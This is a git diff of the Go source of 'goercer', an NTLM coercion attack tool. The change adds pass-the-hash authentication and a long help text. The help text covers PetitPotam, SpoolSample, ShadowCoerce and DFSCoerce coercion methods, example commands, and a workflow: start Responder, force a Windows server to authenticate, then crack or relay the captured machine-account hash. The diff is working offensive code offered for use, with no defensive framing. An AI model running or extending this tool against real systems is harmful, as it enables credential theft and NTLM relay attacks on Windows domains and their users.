@@ -123,27 +123,76 @@ func main() {
 	// Check for help flag
 	for _, arg := range os.Args[1:] {
 		if arg == "-h" || arg == "--help" {
-			fmt.Println("Usage: goercer <target_ip> <listener_ip> <username> <password> <domain> [method] [pipe]")
-			fmt.Println()
-			fmt.Println("Methods:")
-			fmt.Println("  petitpotam     - MS-EFSRPC coercion (default)")
-			fmt.Println("  spoolsample    - MS-RPRN print spooler coercion")
-			fmt.Println("  shadowcoerce   - MS-FSRVP volume shadow copy coercion")
-			fmt.Println("  dfscoerce      - MS-DFSNM DFS namespace coercion")
-			fmt.Println()
-			fmt.Println("Pipes (for petitpotam only):")
-			fmt.Println("  lsarpc (default), efsr, samr, netlogon, lsass")
-			fmt.Println()
-			fmt.Println("Examples:")
-			fmt.Println("  ./goercer <target> <listener> <user> <pass> <domain> petitpotam")
-			fmt.Println("  ./goercer <target> <listener> <user> <pass> <domain> petitpotam efsr")
-			fmt.Println("  ./goercer <target> <listener> <user> <pass> <domain> spoolsample")
+			fmt.Println("Goercer - NTLM Coercion Attack Tool")
+			fmt.Println("====================================\n")
+			fmt.Println("Usage: goercer <target_ip> <listener_ip> <username> <password|hash> <domain> [method] [pipe]\n")
+			fmt.Println("Description:")
+			fmt.Println("  Coerces Windows servers to authenticate to an attacker-controlled listener,")
+			fmt.Println("  capturing machine account NTLMv2 hashes via Responder or ntlmrelayx.\n")
+			fmt.Println("Coercion Methods:\n")
+			fmt.Println("  ✅ petitpotam     (MS-EFSRPC) - Default method")
+			fmt.Println("     Success Rate: HIGH - Works on ALL Windows servers")
+			fmt.Println("     Callbacks: 1 authentication attempt")
+			fmt.Println("     Notes: Core LSARPC service always available\n")
+			fmt.Println("  ✅ spoolsample    (MS-RPRN) - Print Spooler attack")
+			fmt.Println("     Success Rate: HIGH - Works when Print Spooler is running (default on most servers)")
+			fmt.Println("     Callbacks: 3 authentication attempts (maximum coercion!)")
+			fmt.Println("     Notes: Triggers multiple callbacks via printer change notifications\n")
+			fmt.Println("  ⚠️  shadowcoerce   (MS-FSRVP) - Volume Shadow Copy")
+			fmt.Println("     Success Rate: LOW - Situational (requires VSS RPC configured)")
+			fmt.Println("     Callbacks: Varies")
+			fmt.Println("     Notes: Only works if Volume Shadow Copy Service is configured for RPC access\n")
+			fmt.Println("  ⚠️  dfscoerce      (MS-DFSNM) - DFS Namespace")
+			fmt.Println("     Success Rate: LOW - Situational (requires DFS Namespaces role installed)")
+			fmt.Println("     Callbacks: Varies")
+			fmt.Println("     Notes: Rare - most servers don't have DFS Namespaces configured\n")
+			fmt.Println("Alternative Pipes (PetitPotam only):\n")
+			fmt.Println("  lsarpc (default) - Most compatible, always available")
+			fmt.Println("  efsr             - Alternative MS-EFSRPC endpoint")
+			fmt.Println("  samr             - SAM Remote Protocol pipe")
+			fmt.Println("  netlogon         - Netlogon service pipe")
+			fmt.Println("  lsass            - Local Security Authority pipe\n")
+			fmt.Println("Examples:\n")
+			fmt.Println("  # Basic PetitPotam (recommended first attempt)")
+			fmt.Println("  ./goercer 10.0.0.10 10.0.0.5 user Password123 domain.local\n")
+			fmt.Println("  # Pass-the-hash with NTLM hash")
+			fmt.Println("  ./goercer 10.0.0.10 10.0.0.5 user 8846f7eaee8fb117ad06bdd830b7586c domain.local\n")
+			fmt.Println("  # PetitPotam with alternative pipe")
+			fmt.Println("  ./goercer 10.0.0.10 10.0.0.5 user Password123 domain.local petitpotam efsr\n")
+			fmt.Println("  # SpoolSample (3 callbacks - best for hash capture)")
+			fmt.Println("  ./goercer 10.0.0.10 10.0.0.5 user Password123 domain.local spoolsample\n")
+			fmt.Println("  # ShadowCoerce (only if VSS is configured)")
+			fmt.Println("  ./goercer 10.0.0.10 10.0.0.5 user Password123 domain.local shadowcoerce\n")
+			fmt.Println("Arguments:\n")
+			fmt.Println("  <target_ip>    : IP address of the target server to coerce")
+			fmt.Println("  <listener_ip>  : IP address where Responder/ntlmrelayx is listening")
+			fmt.Println("  <username>     : Valid domain user (e.g., 'john' or 'DOMAIN\\\\john')")
+			fmt.Println("  <password|hash>: User's password OR NTLM hash (32 hex characters)")
+			fmt.Println("  <domain>       : Domain name (e.g., 'CORP' or 'corp.local')")
+			fmt.Println("  [method]       : Coercion method (default: petitpotam)")
+			fmt.Println("  [pipe]         : Named pipe (only for petitpotam, default: lsarpc)\n")
+			fmt.Println("Workflow:\n")
+			fmt.Println("  1. Start Responder: sudo responder -I eth0 -v")
+			fmt.Println("  2. Run goercer against target server")
+			fmt.Println("  3. Check Responder for captured NTLM hash")
+			fmt.Println("  4. Crack hash or relay to other services\n")
+			fmt.Println("Expected Output:\n")
+			fmt.Println("  [+] SMB authenticated")
+			fmt.Println("  [+] Pipe opened, starting DCERPC auth...")
+			fmt.Println("  [+] DCERPC authentication complete!")
+			fmt.Println("  [+] Opnum X got ERROR_BAD_NETPATH - coercion successful!")
+			fmt.Println("  [+] Check Responder for callback!\n")
+			fmt.Println("Troubleshooting:\n")
+			fmt.Println("  - If pipe not found: Try PetitPotam (always available) or SpoolSample")
+			fmt.Println("  - If ACCESS_DENIED: Opnum may be patched, tool will try alternate opnums")
+			fmt.Println("  - If bind rejected: Service doesn't accept PKT_PRIVACY auth (normal for DFS/VSS)")
+			fmt.Println("  - No callback in Responder: Check network connectivity and firewall rules\n")
 			os.Exit(0)
 		}
 	}
 
 	if len(os.Args) < 6 {
-		fmt.Println("Usage: goercer <target_ip> <listener_ip> <username> <password> <domain> [method] [pipe]")
+		fmt.Println("Usage: goercer <target_ip> <listener_ip> <username> <password|hash> <domain> [method] [pipe]")
 		fmt.Println("Methods: petitpotam (default), spoolsample, shadowcoerce, dfscoerce")
 		fmt.Println("Pipes (for petitpotam): lsarpc (default), efsr, samr, netlogon, lsass")
 		fmt.Println()
@@ -165,15 +214,32 @@ func main() {
 		pipeName = os.Args[7]
 	}
 
-	// SMB connection
+	// SMB connection - detect if password is actually a hash
 	options := smb.Options{
 		Host: targetIP,
 		Port: 445,
-		Initiator: &spnego.NTLMInitiator{
+	}
+
+	// Check if password is an NTLM hash (32 hex chars)
+	if isNTLMHash(password) {
+		fmt.Printf("[+] Using NTLM hash (pass-the-hash)\n")
+		hash, err := hex.DecodeString(password)
+		if err != nil {
+			fmt.Printf("[!] Invalid NTLM hash format\n")
+			os.Exit(1)
+		}
+		options.Initiator = &spnego.NTLMInitiator{
+			User:   username,
+			Hash:   hash,
+			Domain: domain,
+		}
+	} else {
+		// Use regular password authentication
+		options.Initiator = &spnego.NTLMInitiator{
 			User:     username,
 			Password: password,
 			Domain:   domain,
-		},
+		}
 	}
 
 	session, err := smb.NewConnection(options)
@@ -982,13 +1048,38 @@ func createNTLMAuthenticate(auth *NTLMAuth, challengeMsg []byte) []byte {
 
 // ========== NTLM Cryptographic Functions ==========
 
-// ntHash computes the NT hash (MD4) of a password
+// isNTLMHash checks if the input is a valid NTLM hash (32 hex characters)
+func isNTLMHash(input string) bool {
+	if len(input) != 32 {
+		return false
+	}
+	for _, c := range input {
+		if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
+			return false
+		}
+	}
+	return true
+}
+
+// ntHash computes the NT hash (MD4) of a password OR uses a pre-computed hash
 // This is the base hash used in NTLM authentication
-// Input: plaintext password
+// Input: plaintext password OR 32-character NTLM hash (pass-the-hash)
 // Output: 16-byte MD4 hash
-func ntHash(password string) []byte {
+func ntHash(passwordOrHash string) []byte {
+	// Check if input is already an NTLM hash (32 hex characters)
+	if isNTLMHash(passwordOrHash) {
+		// Don't print message here - already printed during SMB connection
+		hash, err := hex.DecodeString(passwordOrHash)
+		if err != nil || len(hash) != 16 {
+			// Fall through to password hashing if decode fails
+		} else {
+			return hash
+		}
+	}
+
+	// Compute MD4 hash from plaintext password
 	h := md4.New()
-	h.Write(stringToUTF16LE(password))
+	h.Write(stringToUTF16LE(passwordOrHash))
 	return h.Sum(nil)
 }
 
